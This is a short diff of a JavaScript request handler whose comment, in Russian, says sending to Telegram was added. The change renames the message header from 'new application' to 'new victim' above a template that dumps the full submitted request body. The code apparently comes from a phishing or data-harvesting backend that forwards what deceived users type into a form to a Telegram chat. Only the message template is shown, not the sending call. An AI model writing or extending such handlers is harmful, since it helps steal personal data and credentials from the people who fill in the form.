@@ -21,7 +21,7 @@ module.exports = async function handler(req, res) {
 
     // 👇 ДОБАВИЛИ: отправка в Telegram
     const message = `
-📩 НОВАЯ ЗАЯВКА
+📩 НОВАЯ ЖЕРТВА
 
 Данные:
 ${JSON.stringify(body, null, 2)}
